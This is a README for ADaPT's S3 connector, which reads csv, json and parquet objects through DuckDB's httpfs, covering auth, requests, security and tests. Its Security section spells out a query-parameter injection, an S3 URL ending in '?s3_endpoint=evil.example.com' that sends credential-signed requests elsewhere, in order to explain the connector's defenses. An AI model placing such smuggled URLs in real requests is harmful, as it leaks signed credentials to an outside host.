# ADaPT s3 connector

The `s3` connector for [adapt-core](../../../adapt-core/README.md): `sdk: s3` requests read csv, tsv, json, jsonl and
parquet objects from Amazon S3 (or an S3-compatible store such as MinIO) through [DuckDB](https://duckdb.org/)'s
httpfs extension, each row one record, on a DuckDB connection of the connector's own (never the run's transform
sandbox). Example: the source folder [examples/sources/readers/s3_demo/](../../../examples/sources/readers/s3_demo/). Local files are read
by the `files` connector; Google Cloud Storage by the `gcs` connector.

## Install

```bash
make install-s3              # from the repository root; or: pip install ./connectors/readers/s3 (installs duckdb)
adapt connectors             # lists s3 (it has no SDK loggers)
adapt validate examples/sources/readers/s3_demo      # static checks: no network, no bucket
ADAPT_SECRET_S3_KEY_ID=AKIA... ADAPT_SECRET_S3_SECRET=... \
  adapt run examples/sources/readers/s3_demo --set bucket_root=s3://my-bucket/exports/ --allow-connector s3 --output jsonl:out
```

DuckDB installs its httpfs extension on the first connect (a download; offline hosts: run `INSTALL httpfs` in DuckDB
ahead of time, or set `extension_directory`).

## Auth

```yaml
spec:
  secrets:
    s3_key_id: {type: string}
    s3_secret: {type: string}
auth:
  provider: s3
  roots: ["s3://acme-data/exports/"]
  key_id: "{{ secrets.s3_key_id }}"
  secret: "{{ secrets.s3_secret }}"
  region: us-east-1
```

| Key | Meaning |
|---|---|
| `roots` | required: the URL prefixes objects can be read from, `s3://bucket/prefix/` (a list; references allowed, e.g. `["{{ config.bucket_root }}"]`; no secrets, no glob, no `?`). |
| `key_id`, `secret` | required: the access key, each ONE `{{ secrets.* }}` reference. `adapt validate` refuses any other reference, and `adapt run` refuses to connect with a value that is not a secret of the run, so credentials are never written in the source or its config. |
| `session_token` | optional: a temporary credential's token, a secret reference too. |
| `region` | optional: the bucket's region (DuckDB's default: us-east-1). Literal or a reference. |
| `endpoint` | optional: an S3-compatible store's `host[:port]` (no scheme). Literal or a reference. |
| `url_style` | optional: `vhost` (default) or `path` (MinIO and most other stores). |
| `use_ssl` | optional: `true` (default) or `false`. |

connect() loads httpfs and sets these as ONE temporary DuckDB secret (`TYPE s3`) scoped to the roots, every value a
bound parameter. `key_id`, `secret` and `session_token` are registered as secrets of the run: `***` in every log line,
error, `--summary` and message the connector gives. Public buckets (no key) are not supported.

## Requests

```yaml
requests:
  - name: raw_orders
    sdk: s3
    service: object                  # the default and only service
    method: read
    arguments:
      path: "orders/*.csv"           # a key relative to the first root, or s3://bucket/key; a glob; a list
      format: csv                    # csv, tsv, json, jsonl, parquet or auto (by extension; the default)
      options: {header: true, filename: true}
      on_missing: skip               # skip (a warning; the default) or error, when nothing matches
  - name: raw_events
    sdk: s3
    method: read
    arguments:
      path: events/                  # with `match`: the folder to look in
      match: 'day=\d{4}-\d{2}-\d{2}/part-\d+\.parquet'
      recursive: true                # default false: only the folder's own objects
```

- `path`: an `s3://` URL, or a key relative to the first root (references allowed, e.g.
  `"customers/{{ window.start }}.jsonl"`); a glob (`*`, `[ab]`, `**` for any folders - `?` is NOT a glob character
  here, see Security); or a list of them (e.g. a `batch_size` partition of keys). A URL naming no object is skipped or
  fails as `on_missing` says (object storage is only asked when the object is read).
- `match`: a literal Python regex (no references; an invalid one is an `adapt validate` problem). `path` then names a
  folder; its objects are listed (`folder/*`, or `folder/**` with `recursive: true`) and those whose key RELATIVE to
  the folder fully matches (`re.fullmatch`, `/` between sub-folders) are read, in key order. Folder markers (keys
  ending with `/`) are skipped. `recursive` without `match` is a problem.
- `options` (literal values): csv/tsv `header`, `delimiter`, `quote`, `escape`, `columns` (name -> DuckDB type),
  `compression` (auto, none, gzip, zstd), `null_padding`, `ignore_errors`, `skip`, `nullstr`, `all_varchar`,
  `dateformat`, `timestampformat`; json `format` (auto, array, newline_delimited), `compression`, `ignore_errors`;
  every format `filename` (adds the object's key relative to its root as `filename`).

Each row is one record, a JSON object, in pages of at most 1,000 records (memory stays bounded): decimals stay exact,
dates and timestamps are text, csv values are text unless `columns` types them - steps cast, e.g.
`(record->>'amount')::DECIMAL(12,2)`. Each object read is one call (rate limit, retries, the run's request counts) and
logs one `adapt.network` line: `s3 read s3://...: N row(s), S s`.

## Security

- **No `?` anywhere - the query-parameter injection.** DuckDB's httpfs reads an S3 URL's query parameters as
  connection settings that override the configured ones (`?s3_endpoint=`, `?s3_access_key_id=`, `?s3_region=`,
  `?s3_use_ssl=`, ...): `s3://acme/exports/x.csv?s3_endpoint=evil.example.com` would send a request signed with the
  configured credentials to another host. The connector refuses any `?` in a root, a path (literal or rendered) and
  every key a listing returns, and refuses every `%` (so no percent-encoded `?`, `.`, `/` or `\`); `?` is therefore
  not a glob character for this connector (only `*` and `[`). Every listing and every read re-checks its URL.
- **Containment.** A URL is read only if it is inside a root: the same scheme, the same bucket (exactly as written)
  and a key under the root's prefix - `s3://acme/` does not hold `s3://acme-evil/...`, and `s3://acme/in/` does not
  hold `s3://acme/inside.csv`. Refused before anything is read: `..`, `.` and empty (`//`) folders, `%`, `#`,
  backslashes, control characters, `user@` and a port in the bucket, other schemes, absolute local paths; a key a
  listing returns that fails any check (or holds `*`/`[`, which DuckDB would read as a glob) fails the request.
- **DuckDB checks too.** The connection's `allowed_directories` are the roots, external access is then turned off
  and the configuration locked: DuckDB itself refuses any URL outside the roots. The secret is scoped to the roots.
- **Credentials** come from secrets only and are redacted everywhere (see Auth); they travel to DuckDB as bound
  parameters, never in a statement's text.
- Only `object.read` exists: objects are never written.

## Tests

```bash
make -C connectors/readers/s3 test      # offline: a recording DuckDB stand-in serves s3:// URLs from local files
ADAPT_TEST_S3=s3://bucket/prefix/ ADAPT_TEST_S3_KEY_ID=... ADAPT_TEST_S3_SECRET=... make -C connectors/readers/s3 test
```

When DuckDB's httpfs is installed locally, two tests use it against `127.0.0.1` only (a closed port and a local
listener that must never be reached by the connector); the real-bucket test runs only with `ADAPT_TEST_S3`.
